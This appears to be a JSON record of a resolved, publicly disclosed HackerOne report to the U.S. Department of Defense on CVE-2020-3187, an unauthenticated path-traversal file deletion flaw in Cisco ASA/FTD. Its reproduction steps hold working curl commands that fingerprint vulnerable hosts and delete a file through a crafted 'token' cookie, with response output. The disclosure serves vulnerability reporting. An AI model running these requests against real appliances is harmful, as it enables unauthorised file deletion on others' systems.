@@ -1,0 +1,115 @@
+{
+  "id": 978335,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NzgzMzU=",
+  "url": "https://hackerone.com/reports/978335",
+  "title": "Unauthenticated Arbitrary File Deletion (\"CVE-2020-3187\") in ████████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-09-10T11:22:21.063Z",
+  "submitted_at": "2020-09-10T11:22:21.080Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dwisiswant0",
+    "url": "/dwisiswant0",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/eRPNkF8X1okx5CKDRCtdiVp8/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-3187"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-09-29T20:29:44.063Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-09-28T18:23:20.760Z",
+  "team_member_agreed_on_going_public_at": "2020-09-29T20:29:43.970Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Description:**\n\nA vulnerability in the interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and obtain read and delete access to sensitive files.\n\nVulnerable host:\n\n- `https://██████/`\n\n## Impact\n\nAn exploit could allow the attacker to view or delete arbitrary files on the system.\n\n## Step-by-step Reproduction Instructions\n\n1) Identifying vulnerable host by send request to `/+CSCOE+/session_password.html`.\n\n```bash\n> curl -skiL \"https://██████/+CSCOE+/session_password.html\"\n```\n\n```\nGET /+CSCOE+/session_password.html HTTP/1.1\nHost: ███████\nUser-Agent: curl/7.47.0\nAccept: */*\n\n```\n\nIf the target is vulnerable, the response header will display `webvpn` header, like:\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 0\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Thu, 10 Sep 2020 04:14:27 GMT\nX-Frame-Options: SAMEORIGIN\nwebvpn: \n\n```\n\n2) Perform exploits to delete files by adding `token` in cookie header request.\n\nFor example, I want to delete this (https://████/+CSCOU+/csco_logo.gif) file.\n\n```bash\n> curl -Ik https://██████████/+CSCOU+/csco_logo.gif\n< HTTP/1.1 200 OK\n< Content-Type: image/gif\n< Content-Length: 2678\n< Cache-Control: max-age=6000\n< Connection: Keep-Alive\n< Date: Thu, 10 Sep 2020 04:19:54 GMT\n< X-Frame-Options: SAMEORIGIN\n```\n\nRequest:\n\n```bash\n> curl -skiL \"https://███████/+CSCOE+/session_password.html\" \\\n  -H \"Cookie: token=../+CSCOU+/csco_logo.gif\" \n```\n\n```\nGET /+CSCOE+/session_password.html HTTP/1.1\nHost: ███████\nCookie: token=../+CSCOU+/csco_logo.gif\nUser-Agent: curl/7.47.0\nAccept: */*\n\n```\n\nThe following response is shown:\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 0\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nDate: Thu, 10 Sep 2020 04:21:02 GMT\nX-Frame-Options: SAMEORIGIN\nwebvpn: \n\n```\n\nFile deleted successfully:\n\n```bash\n> curl -Ik https://██████████/+CSCOU+/csco_logo.gif\n< HTTP/1.1 404 Not Found\n< Cache-Control: no-cache\n< Pragma: no-cache\n< Connection: Close\n< Date: Thu, 10 Sep 2020 04:21:20 GMT\n< X-Frame-Options: SAMEORIGIN\n```\n\n## Suggested Mitigation/Remediation Actions\n\n- https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43\n\n## Impact\n\nAn exploit could allow the attacker to view or delete arbitrary files on the system.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 10,
+  "voters": [
+    "ivodafon",
+    "tess",
+    "j3rry-1729",
+    "dastan_9408",
+    "dwisiswant0",
+    "wayc0de",
+    "alpha_sk003",
+    "shreeeyaa",
+    "cipherd2",
+    "z3rod3x"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
